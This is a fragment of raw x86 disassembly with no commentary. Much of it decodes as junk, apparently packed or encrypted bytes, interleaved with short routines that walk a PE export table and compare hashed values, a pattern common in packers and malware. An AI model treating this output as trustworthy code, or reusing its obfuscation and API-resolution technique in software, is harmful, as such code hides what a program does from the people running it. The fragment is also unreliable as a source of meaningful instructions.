  40c04d:	and    eax,0x1e9649d9
  40c052:	mov    dl,0x13
  40c054:	jns    0x40c0a7
  40c056:	addr16 lahf 
  40c058:	in     eax,dx
  40c059:	push   ebp
  40c05a:	gs xor eax,0xde8fcc9d
  40c060:	lods   al,BYTE PTR ds:[esi]
  40c061:	mov    ah,0x19
  40c063:	(bad)  
  40c064:	push   ss
  40c065:	sbb    ebp,DWORD PTR [eax+0x57e4ad78]
  40c06b:	or     al,0x2c
  40c06d:	push   eax
  40c06e:	les    edi,FWORD PTR [edi-0x29]
  40c071:	cdq    
  40c072:	pop    edi
  40c073:	jecxz  0x40c039
  40c075:	and    edi,DWORD PTR [edi+0x24645ece]
  40c07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c07c:	fisubr WORD PTR [edx-0x71]
  40c07f:	clc    
  40c080:	pop    es
  40c081:	xchg   ecx,eax
  40c082:	mov    edi,0xfed04b7d
  40c087:	mov    ch,0x74
  40c089:	cdq    
  40c08a:	and    BYTE PTR [ebx+ecx*1-0x35],dl
  40c08e:	pop    esp
  40c08f:	test   DWORD PTR [edx-0x6f],0x658f966b
  40c096:	mov    al,0x3
  40c098:	dec    eax
  40c099:	and    BYTE PTR [ecx+0x430542],ah
  40c09f:	or     eax,DWORD PTR ds:0x42ee0c
  40c0a5:	mov    ds:0x430542,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43049e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e762
  40c0cb:	mov    ds:0x43049e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4304a6,0x0
  40c0dd:	mov    eax,ds:0x4304a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4304a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4304a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4304b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e776
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e8f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eaf4
  40c11d:	cmp    DWORD PTR ds:0x4304a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	lea    eax,[eax-0x2cd56ce]
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c0eb
  40c153:	sti    
  40c154:	mov    al,0xa9
  40c156:	lahf   
  40c157:	and    eax,0xb22c469
  40c15c:	xlat   BYTE PTR ds:[ebx]
  40c15d:	ins    BYTE PTR es:[edi],dx
  40c15e:	loope  0x40c198
  40c160:	cmp    BYTE PTR [ebp+ebp*4-0x6d79f528],dl
  40c167:	and    ah,BYTE PTR [edi+0x1]
  40c16a:	and    BYTE PTR [esi],dl
  40c16c:	add    eax,0xad0f039b
  40c171:	sbb    al,0x83
  40c173:	fidiv  WORD PTR [ebp-0x7c0beaa5]
  40c179:	jno    0x40c192
  40c17b:	je     0x40c1ac
  40c17d:	cmp    DWORD PTR [esi+0x1caa0e06],eax
  40c183:	ins    BYTE PTR es:[edi],dx
  40c184:	or     al,0xd1
  40c186:	sbb    ch,BYTE PTR [ecx-0x7a]
  40c189:	nop
  40c18a:	add    cl,BYTE PTR [edx+0x3fd9ddd1]
  40c190:	loopne 0x40c16d
  40c192:	imul   ebx,DWORD PTR [esi-0x28],0xebd23a87
  40c199:	mov    al,ds:0xfb7fa97c
  40c19e:	jmp    0x40c1cf
  40c1a0:	imul   DWORD PTR cs:[eax+edi*8-0x7f]
  40c1a5:	(bad)  
  40c1a6:	and    DWORD PTR [eax-0x35],esp
  40c1a9:	ds xor esp,esi
  40c1ac:	imul   ebp,esi,0x864bdbd0
  40c1b2:	xchg   edi,eax
  40c1b3:	mov    dl,0xa
  40c1b5:	mov    dl,0xb0
  40c1b7:	loope  0x40c1f9
  40c1b9:	loopne 0x40c218
  40c1bb:	imul   ebp,DWORD PTR [ebx+0x62],0x9ec9e220
  40c1c2:	out    dx,eax
  40c1c3:	jne    0x40c145
  40c1c5:	cmp    BYTE PTR [esi+0x6d],0x13
  40c1c9:	xchg   ebp,eax
  40c1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1cb:	gs inc edx
  40c1cd:	es sbb eax,0xe417002c
  40c1d3:	icebp  
  40c1d4:	(bad)  [ebx-0x7f]
  40c1d7:	xchg   edx,eax
  40c1d8:	call   FWORD PTR [edx-0x2d]
  40c1db:	push   ebp
  40c1dc:	mov    DWORD PTR [esi+0x54],esp
  40c1df:	xchg   DWORD PTR [ecx],esi
  40c1e1:	and    DWORD PTR [esi+0x52],ebp
  40c1e4:	and    eax,DWORD PTR [ebx+0xa]
  40c1e7:	pop    esp
  40c1e8:	jnp    0x40c1ac
  40c1ea:	dec    edi
  40c1eb:	mov    ebp,0x4b66b491
  40c1f0:	retf   
  40c1f1:	test   ebp,edx
  40c1f3:	test   al,0x49
  40c1f5:	(bad)  
  40c1f7:	mov    eax,ds:0xb721bf4a
  40c1fc:	out    0x3e,eax
  40c1fe:	push   edx
  40c1ff:	hlt    
  40c200:	adc    eax,0x4b287084
  40c205:	jl     0x40c204
  40c207:	mov    eax,ds:0x7bb6c298
  40c20c:	mov    eax,0x6f45af2a
  40c211:	test   BYTE PTR [ebx+0x78],0xcd
  40c215:	je     0x40c1ca
  40c217:	retf   0xae30
  40c21a:	push   ebp
  40c21b:	lea    edi,[eax-0x71]
  40c21e:	mov    edx,edx
  40c220:	mov    esi,0x82af2cda
  40c225:	mov    eax,0xc67a865e
  40c22a:	pop    esp
  40c22b:	leave  
  40c22c:	inc    edi
  40c22d:	mov    bh,0x9c
  40c22f:	loope  0x40c1db
  40c231:	sbb    DWORD PTR [ebp-0x7a],0xffffffbb
  40c235:	outs   dx,BYTE PTR ds:[esi]
  40c236:	sbb    BYTE PTR [edi],cl
  40c238:	in     eax,0x0
  40c23a:	mov    eax,gs:0xbe4a8072
  40c240:	call   0x3ab6:0xa19a17e8
  40c247:	test   BYTE PTR [edx+0x6b343868],dl
  40c24d:	fs ss jne 0x40c2b0
  40c251:	xchg   DWORD PTR [edx-0x55],edi
  40c254:	push   es
  40c255:	cmp    DWORD PTR [ebx+esi*2-0x67e5521c],0x54447d46
  40c260:	sbb    DWORD PTR [ecx+0x222061b],0x6c9a0d34
  40c26a:	jae    0x40c219
  40c26c:	mov    ah,0x61
  40c26e:	iret   
  40c26f:	jge    0x40c29b
  40c271:	sti    
  40c272:	sbb    DWORD PTR [ecx],ebp
  40c274:	bnd jae 0x40c1ff
  40c277:	std    
  40c278:	jl     0x40c2a5
  40c27a:	jae    0x40c20e
  40c27c:	add    DWORD PTR [ecx+0x22],edx
  40c27f:	mov    ds:0x63d7662e,al
  40c284:	out    0xa,al
  40c286:	aas    
  40c287:	mov    dl,0xcf
  40c289:	(bad)  
  40c28a:	sub    eax,0x5e1047b
  40c28f:	push   ebx
  40c290:	stos   DWORD PTR es:[edi],eax
  40c291:	pushf  
  40c292:	test   DWORD PTR [ecx+0x458bec4d],ecx
  40c298:	fmul   DWORD PTR [ebx+0xc03084d]
  40c29e:	mov    eax,0x159e9
  40c2a3:	add    BYTE PTR [ebp-0x42cd666a],cl
  40c2a9:	in     eax,0x5d
  40c2ab:	imul   edx,DWORD PTR ds:0x56e92bcc,0xf3325906
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c332
  40c2bd:	scas   eax,DWORD PTR es:[edi]
  40c2be:	test   BYTE PTR [edi-0x41b56765],0x27
  40c2c5:	pop    esi
  40c2c6:	es jg  0x40c313
  40c2c9:	fs cdq 
  40c2cb:	retf   0x1a94
  40c2ce:	sbb    DWORD PTR [eax],edx
  40c2d0:	mov    dh,0x9d
  40c2d2:	repz aaa 
  40c2d4:	xchg   DWORD PTR [ebp+0x5acc93a3],eax
  40c2da:	shl    esp,cl
  40c2dc:	add    DWORD PTR [ecx],esi
  40c2de:	jne    0x40c28d
  40c2e0:	call   0xcf58:0xab746273
  40c2e7:	out    dx,al
  40c2e8:	sbb    dl,BYTE PTR [edx-0x3c]
  40c2eb:	cld    
  40c2ec:	mov    bh,ah
  40c2ee:	sub    eax,0x68f44be2
  40c2f3:	dec    esi
  40c2f4:	out    dx,al
  40c2f5:	dec    ecx
  40c2f6:	test   bl,bh
  40c2f8:	lods   al,BYTE PTR ds:[esi]
  40c2f9:	mov    ds:0x72a28be7,eax
  40c2ff:	sub    DWORD PTR [ecx+0x2593de74],edx
  40c305:	xor    esp,DWORD PTR [eax-0x2c0f0ede]
  40c30b:	and    eax,0xb510e83b
  40c310:	stc    
  40c311:	push   0xc91cf99f
  40c316:	mov    dh,0xa9
  40c318:	adc    BYTE PTR [edi],bh
  40c31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c31b:	mov    WORD PTR [edi+0x5b],?
  40c31e:	mov    ebx,0x7de896b
  40c323:	mov    eax,0xa6ddde15
  40c328:	inc    edx
  40c329:	ror    BYTE PTR [eax],cl
  40c32b:	cmp    BYTE PTR [ebx],0x13
  40c32e:	loopne 0x40c365
  40c330:	cwde   
  40c331:	mov    dl,BYTE PTR [edi+0x61893e82]
  40c337:	call   0x38c87205
  40c33c:	xchg   esp,eax
  40c33d:	stos   DWORD PTR es:[edi],eax
  40c33e:	sub    DWORD PTR [edi+0x1a],esp
  40c341:	(bad)  
  40c343:	dec    ecx
  40c344:	mov    ebx,DWORD PTR [ebp+0x1e]
  40c347:	mov    ebx,0x906bae12
  40c34c:	gs dec esp
  40c34e:	mov    WORD PTR [edi+ebx*1],fs
  40c351:	sbb    bh,bh
  40c353:	into   
  40c354:	inc    esi
  40c355:	das    
  40c356:	(bad)  
  40c357:	mov    DWORD PTR [ecx],ebp
  40c359:	scas   eax,DWORD PTR es:[edi]
  40c35a:	ja     0x40c30f
  40c35c:	push   ebx
  40c35d:	aam    0x69
  40c35f:	repnz push ebp
  40c361:	mov    es,WORD PTR [eax+0x7a]
  40c364:	outs   dx,BYTE PTR ds:[esi]
  40c365:	xor    DWORD PTR [esi-0x520a0b44],0xffffffc0
  40c36c:	mov    al,ds:0x97f08173
  40c371:	lahf   
  40c372:	(bad)  
  40c373:	mov    edx,0xd399f152
  40c378:	scas   eax,DWORD PTR es:[edi]
  40c379:	add    esp,DWORD PTR [ebx]
  40c37b:	mov    ?,WORD PTR [esi]
  40c37d:	jne    0x40c377
  40c37f:	in     al,0x37
  40c381:	or     eax,DWORD PTR [edi]
  40c383:	xchg   edx,eax
  40c384:	fwait
  40c385:	adc    esi,edi
  40c387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c388:	not    DWORD PTR [ecx+0x6547e554]
  40c38e:	addr16 clc 
  40c390:	arpl   WORD PTR [eax+0x74c5bb47],dx
  40c396:	gs or  eax,0xf8fdc7e1
  40c39c:	imul   ah
  40c39e:	out    dx,al
  40c39f:	add    BYTE PTR fs:[edi],ah
  40c3a2:	mov    DWORD PTR [esi-0xd485a56],ebp
  40c3a8:	mov    fs,WORD PTR [edi+0x55043a55]
  40c3ae:	add    ch,dl
  40c3b0:	cmp    dh,BYTE PTR [edi+0x7d]
  40c3b3:	idiv   DWORD PTR [ecx]
  40c3b5:	sbb    dl,BYTE PTR [edx+ebx*8-0x66]
  40c3b9:	fimul  DWORD PTR [esp+ebp*1]
  40c3bc:	js     0x40c36a
  40c3be:	sbb    DWORD PTR [eax+ebp*2+0x39578bd4],edx
  40c3c5:	add    DWORD PTR [eax-0x1f378d85],eax
  40c3cb:	dec    ebx
  40c3cc:	and    ah,BYTE PTR [edx+edi*2+0x12]
  40c3d0:	xchg   esp,eax
  40c3d1:	jle    0x40c3ca
  40c3d3:	and    ah,ah
  40c3d5:	mov    ecx,DWORD PTR [ebx-0x3accd5f8]
  40c3db:	or     DWORD PTR [ecx],0xffffffdb
  40c3de:	push   es
  40c3df:	scas   al,BYTE PTR es:[edi]
  40c3e0:	push   esi
  40c3e1:	lock imul BYTE PTR [eax+0x72]
  40c3e5:	iret   
  40c3e6:	retf   0x4d54
  40c3e9:	loopne 0x40c3db
  40c3eb:	mov    al,ch
  40c3ed:	mov    al,0xc
  40c3ef:	repnz imul edx,eax,0x601e2678
  40c3f6:	adc    eax,0xe199e5ff
  40c3fb:	ret    0x8d6b
  40c3fe:	inc    ebp
  40c3ff:	clc    
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	dec    esp
  40c412:	sub    BYTE PTR [ebx+esi*2],cl
  40c415:	mov    ah,0xff
  40c417:	jle    0x40c497
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c46a
  40c41e:	aas    
  40c41f:	jb     0x40c442
  40c421:	inc    edx
  40c422:	mov    ds:0x62c1804f,eax
  40c427:	push   cs
  40c428:	popf   
  40c429:	mov    ebp,0xaaabc1dd
  40c42e:	pop    esp
  40c42f:	xchg   ebx,eax
  40c430:	cli    
  40c431:	or     al,0xb1
  40c433:	and    eax,0x8a5c4a5a
  40c438:	xchg   esp,eax
  40c439:	lock jle 0x40c3fb
  40c43c:	cdq    
  40c43d:	and    cl,BYTE PTR [edi-0x4cd6cffc]
  40c443:	add    al,0x80
  40c445:	mov    ebx,0xf572f811
  40c44a:	(bad)  
  40c44b:	dec    esp
  40c44c:	cmp    ah,BYTE PTR [edi+0x5a]
  40c44f:	and    DWORD PTR [ecx-0x52],edi
  40c452:	(bad)
  40c456:	adc    al,0xbb
  40c458:	test   DWORD PTR [ecx],ecx
  40c45a:	ficomp WORD PTR [esi]
  40c45c:	add    eax,0xd659d330
  40c461:	push   0x4b
  40c463:	aad    0x80
  40c465:	lock xor al,0xec
  40c468:	aad    0x95
  40c46a:	xchg   ebx,eax
  40c46b:	cmp    eax,0xeb517682
  40c470:	xor    cl,dl
  40c472:	push   ebx
  40c473:	and    eax,0x999f6825
  40c478:	pop    ebp
  40c479:	call   0xe61da553
  40c47e:	mov    esi,0x7cd93588
  40c483:	mov    DWORD PTR [ecx],edx
  40c485:	push   cs
  40c486:	imul   eax,DWORD PTR ds:0xd6210dbf,0x45a8c4de
  40c490:	xchg   ebp,eax
  40c491:	in     eax,dx
  40c492:	neg    DWORD PTR [ecx]
  40c494:	or     al,0xe6
  40c496:	in     al,dx
  40c497:	dec    ebp
  40c498:	push   ecx
  40c499:	stc    
  40c49a:	sysenter 
  40c49c:	push   cs
  40c49d:	test   DWORD PTR [edx+0xb],eax
  40c4a0:	cmp    DWORD PTR [ebp+0xf12de97],ebp
  40c4a6:	lds    eax,FWORD PTR [ebx]
  40c4a8:	sbb    al,0x5d
  40c4aa:	outs   dx,DWORD PTR ds:[esi]
  40c4ab:	(bad)  
  40c4ac:	(bad)  
  40c4ae:	mov    BYTE PTR [eax-0x19cae838],ah
  40c4b4:	pop    ds
  40c4b5:	(bad)  
  40c4b6:	fs aaa 
  40c4b8:	jb     0x40c472
  40c4ba:	and    DWORD PTR [ebx],eax
  40c4bc:	sbb    DWORD PTR [edx],0xffffffb1
  40c4bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4c0:	mov    eax,ds:0x1bee9b63
  40c4c5:	ret    0x68a4
  40c4c8:	into   
  40c4c9:	sub    al,0xfd
  40c4cb:	popa   
  40c4cc:	outs   dx,BYTE PTR ds:[esi]
  40c4cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ce:	shl    DWORD PTR [edi-0x60cfe842],cl
  40c4d4:	or     BYTE PTR [ebx],dl
  40c4d6:	(bad)  
  40c4d7:	adc    ebx,esi
  40c4d9:	mov    cl,BYTE PTR [edx]
  40c4db:	popf   
  40c4dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4dd:	(bad)  
  40c4df:	out    dx,eax
  40c4e0:	xlat   BYTE PTR ds:[ebx]
  40c4e1:	out    0x87,al
  40c4e3:	mov    cl,0xaa
  40c4e5:	gs push esp
  40c4e7:	pop    ds
  40c4e8:	pushf  
  40c4e9:	xchg   edi,eax
  40c4ea:	mov    ah,BYTE PTR gs:[edx+0x3aa299ae]
  40c4f1:	sbb    al,0x94
  40c4f3:	mov    bh,al
  40c4f5:	mov    ebp,0xf8b358df
  40c4fa:	cmp    al,0x26
  40c4fc:	xchg   edi,eax
  40c4fd:	ret    0xffad
  40c500:	cmp    al,0x5b
  40c502:	push   edx
  40c503:	push   esp
  40c504:	xlat   BYTE PTR ds:[ebx]
  40c505:	jp     0x40c57b
  40c507:	mov    WORD PTR [ecx+0x48],?
  40c50a:	icebp  
  40c50b:	bound  ecx,QWORD PTR [ecx+eax*1-0x511f82d8]
  40c512:	retf   
  40c513:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40c515:	stos   DWORD PTR es:[edi],eax
  40c516:	repz xor BYTE PTR [esi],bh
  40c519:	jmp    0xa1504a8e
  40c51e:	pop    es
  40c51f:	mov    ch,0x58
  40c521:	push   ebp
  40c522:	and    al,0xe2
  40c524:	mov    ebx,0x8dacf415
  40c529:	and    dl,al
  40c52b:	les    edi,FWORD PTR [ebx+0x20]
  40c52e:	pop    esi
  40c52f:	repz add BYTE PTR [ecx],al
  40c532:	addr16 imul ecx,DWORD PTR [bp+si+0x535a],0xffffffe1
  40c539:	jo     0x40c564
  40c53b:	sbb    DWORD PTR [ebx+0x2e8425f9],ecx
  40c541:	or     bh,ch
  40c543:	push   ebx
  40c544:	outs   dx,DWORD PTR ds:[esi]
  40c545:	lahf   
  40c546:	popa   
  40c547:	jg     0x40c575
  40c549:	retf   0x46c5
  40c54c:	lahf   
  40c54d:	and    BYTE PTR [esi],al
  40c54f:	push   eax
  40c550:	xchg   edx,eax
  40c551:	and    DWORD PTR ds:0x63ceb11a,esp
  40c557:	js     0x40c4ff
  40c559:	in     eax,dx
  40c55a:	cmp    al,0x11
  40c55c:	scas   al,BYTE PTR es:[edi]
  40c55d:	mov    ecx,0x50d04d89
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0xaf257589
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5fc
  40c58e:	fidiv  DWORD PTR [esi]
  40c590:	dec    edx
  40c591:	lods   eax,DWORD PTR ds:[esi]
  40c592:	jo     0x40c5ac
  40c594:	adc    edx,0xac892dee
  40c59a:	mov    eax,fs:0xe06d3084
  40c5a0:	xor    eax,0x34b3bcf2
  40c5a5:	add    DWORD PTR [esi],esp
  40c5a7:	push   eax
  40c5a8:	dec    ebp
  40c5a9:	mov    ds:0xeacee4fa,al
  40c5ae:	mov    DWORD PTR [esp+ecx*2+0x78],esp
  40c5b2:	push   eax
  40c5b3:	bound  esp,QWORD PTR [edi+0x2c0f95a]
  40c5b9:	or     dh,BYTE PTR [eax+0x40]
  40c5bc:	inc    esp
  40c5bd:	fnclex 
  40c5bf:	inc    ebx
  40c5c0:	mov    edx,0xfd8caf88
  40c5c5:	lahf   
  40c5c6:	lea    edi,[esi+0x3f515444]
  40c5cc:	icebp  
  40c5cd:	stc    
  40c5ce:	out    dx,eax
  40c5cf:	gs fld st(0)
  40c5d2:	les    ebp,FWORD PTR ds:0x37cb9ec3
  40c5d8:	mov    ?,WORD PTR [ebx+0x6ef4cd32]
  40c5de:	lea    eax,[ecx-0x728d0533]
  40c5e4:	xor    ecx,0xfc0f380d
  40c5ea:	mov    ebp,0xf75eb9b8
  40c5ef:	js     0x40c5a3
  40c5f1:	jb     0x40c63b
  40c5f3:	xchg   ecx,eax
  40c5f4:	jge    0x40c5f5
  40c5f6:	push   edx
  40c5f7:	jne    0x40c639
  40c5f9:	add    eax,0x56ab99c3
  40c5fe:	xchg   ebp,eax
  40c5ff:	ret    0xfa63
  40c602:	fld    DWORD PTR [ebx]
  40c604:	imul   edi,eax,0x8b86168a
  40c60a:	xor    eax,0x3f02dbff
  40c60f:	fstp   TBYTE PTR [edx+0x1f]
  40c612:	pop    edx
  40c613:	jle    0x40c605
  40c615:	and    DWORD PTR [eax],0xffffff86
  40c618:	ret    
  40c619:	xchg   edx,eax
  40c61a:	ins    DWORD PTR es:[edi],dx
  40c61b:	sub    DWORD PTR [edi+0x21],ecx
  40c61e:	fdiv   DWORD PTR [esi-0x7a]
  40c621:	ds cmp al,0x81
  40c624:	push   ds
  40c625:	div    DWORD PTR [ebp-0x72]
  40c628:	not    DWORD PTR [esi+0x7b]
  40c62b:	lea    ebx,[edi+0x58191da2]
  40c631:	(bad)  
  40c632:	adc    al,0x30
  40c634:	and    bh,BYTE PTR [esi]
  40c636:	(bad)  
  40c638:	jecxz  0x40c697
  40c63a:	sub    al,0x9c
  40c63c:	ror    esp,1
  40c63e:	test   al,0xd5
  40c640:	mov    edi,0x83a5d0a9
  40c645:	mov    dh,0x4c
  40c647:	xor    ah,BYTE PTR [ebx-0x1d]
  40c64a:	mov    fs,WORD PTR [ebp+0x74]
  40c64d:	inc    edx
  40c64e:	mov    dh,0xf4
  40c650:	adc    BYTE PTR [edx+edi*8+0x46],bh
  40c654:	jae    0x40c628
  40c656:	mov    ah,0x4e
  40c658:	xchg   DWORD PTR [ebx+0x1492b29b],eax
  40c65e:	repnz popf 
  40c660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c661:	cmp    eax,0xc8f7879e
  40c666:	icebp  
  40c667:	jecxz  0x40c60a
  40c669:	enter  0xc97f,0x55
  40c66d:	sub    al,0x43
  40c66f:	je     0x40c697
  40c671:	push   eax
  40c672:	cmp    eax,0x370b480b
  40c677:	retf   
  40c678:	push   ds
  40c679:	jns    0x40c658
  40c67b:	add    edi,edi
  40c67d:	pop    ds
  40c67e:	xchg   DWORD PTR [edx+0x20144451],ebp
  40c684:	out    0xb8,al
  40c686:	xlat   BYTE PTR ds:[ebx]
  40c687:	mov    eax,0xce69957d
  40c68c:	add    edx,eax
  40c68e:	push   ebx
  40c68f:	xor    DWORD PTR [eax],eax
  40c691:	sub    DWORD PTR [ecx],edx
  40c693:	pop    eax
  40c694:	aaa    
  40c695:	jg     0x40c67a
  40c697:	pop    es
  40c698:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c69a:	xlat   BYTE PTR ds:[ebx]
  40c69b:	jbe    0x40c6c5
  40c69d:	fiadd  WORD PTR [ecx]
  40c69f:	dec    esi
  40c6a0:	lock pop edi
  40c6a2:	dec    esp
  40c6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a4:	out    0x76,eax
  40c6a6:	aad    0x8b
  40c6a8:	repz ds shl dh,cl
  40c6ac:	icebp  
  40c6ad:	jns    0x40c72d
  40c6af:	mov    esp,0x91c4edf2
  40c6b4:	push   ebx
  40c6b5:	dec    esi
  40c6b6:	adc    bh,BYTE PTR [ebx+edx*2-0x19739260]
  40c6bd:	daa    
  40c6be:	xchg   ch,ah
  40c6c0:	ins    BYTE PTR es:[edi],dx
  40c6c1:	loop   0x40c69f
  40c6c3:	test   DWORD PTR [ecx-0x3c],edi
  40c6c6:	or     eax,0x9f1196b
  40c6cb:	cmp    DWORD PTR [ebp-0x5c],ecx
  40c6ce:	mov    ecx,DWORD PTR [ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	mov    bh,0x1b
  40c742:	aam    0x4a
  40c744:	ss bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c7ac
  40c74d:	xor    esp,ecx
  40c74f:	sub    eax,0x8697e526
  40c754:	or     al,0x8a
  40c756:	cmp    esi,0xffffffd7
  40c759:	fisttp WORD PTR [edi+0x7a672a0c]
  40c75f:	add    esi,DWORD PTR [edi-0x7a]
  40c762:	xlat   BYTE PTR ds:[ebx]
  40c763:	(bad)  
  40c764:	dec    eax
  40c765:	popf   
  40c766:	jmp    0xa976d97a
  40c76b:	mov    al,BYTE PTR [esi-0x6c]
  40c76e:	sbb    BYTE PTR [edi],bl
  40c770:	push   ecx
  40c771:	add    eax,0xb37c10d7
  40c776:	push   ebx
  40c777:	and    dl,BYTE PTR [ebp+0x779ba239]
  40c77d:	add    cl,BYTE PTR [ebp-0x2a66e803]
  40c783:	scas   al,BYTE PTR es:[edi]
  40c784:	ds mov esi,ebp
  40c787:	mov    ecx,0x25ce264
  40c78c:	cli    
  40c78d:	sti    
  40c78e:	sar    DWORD PTR [edi-0x59],cl
  40c791:	and    esi,edx
  40c793:	loope  0x40c75d
  40c795:	fdiv   DWORD PTR [edx-0x70]
  40c798:	lahf   
  40c799:	xor    al,0x61
  40c79b:	cmp    al,0xfe
  40c79d:	retf   0x197e
  40c7a0:	pop    ss
  40c7a1:	mov    ecx,0xf418c802
  40c7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7a7:	adc    eax,0xb2caa0be
  40c7ac:	mov    ds:0xf08a73c3,al
  40c7b1:	sub    DWORD PTR [eax],edi
  40c7b3:	das    
  40c7b4:	repnz mov edx,edx
  40c7b7:	icebp  
  40c7b8:	cmc    
  40c7b9:	mov    dh,0x2
  40c7bb:	dec    ebx
  40c7bc:	push   esp
  40c7bd:	push   eax
  40c7be:	jle    0x40c78c
  40c7c0:	enter  0xe5cc,0xe6
  40c7c4:	sub    ecx,esi
  40c7c6:	clc    
  40c7c7:	sub    eax,0x5dcde3f8
  40c7cc:	mov    esp,0xbbab6f04
  40c7d1:	iret   
  40c7d2:	out    dx,eax
  40c7d3:	mov    ah,0x0
  40c7d5:	cmp    ah,BYTE PTR ds:0x6094441c
  40c7db:	popa   
  40c7dc:	setl   BYTE PTR [esi-0x2d645b82]
  40c7e3:	and    eax,0xe6e21a79
  40c7e8:	sar    BYTE PTR [esi-0x1c2b39e0],1
  40c7ee:	push   ebx
  40c7ef:	jne    0x40c83b
  40c7f1:	lods   eax,DWORD PTR ds:[esi]
  40c7f2:	ins    DWORD PTR es:[edi],dx
  40c7f3:	inc    eax
  40c7f4:	jmp    0xc8ff7863
  40c7f9:	add    al,0x15
  40c7fb:	pop    ecx
  40c7fc:	mov    eax,ds:0xe59f682e
  40c801:	in     al,0xd4
  40c803:	ja     0x40c7fc
  40c805:	mov    gs,WORD PTR [ebp-0x80]
  40c808:	leave  
  40c809:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c80b:	cmc    
  40c80c:	mov    edi,0xcc88c9f
  40c811:	adc    esi,DWORD PTR es:[ebp+0x7c]
  40c815:	ins    DWORD PTR es:[edi],dx
  40c816:	lds    ebp,FWORD PTR [edx]
  40c818:	or     ch,BYTE PTR [esi+0x20]
  40c81b:	push   edx
  40c81c:	and    DWORD PTR [ebx],ebx
  40c81e:	pop    eax
  40c81f:	add    DWORD PTR [ebp+0x4af8ad8],0x78
  40c826:	out    0x3b,eax
  40c828:	dec    ecx
  40c829:	les    ebp,FWORD PTR [ebp+0x67]
  40c82c:	iret   
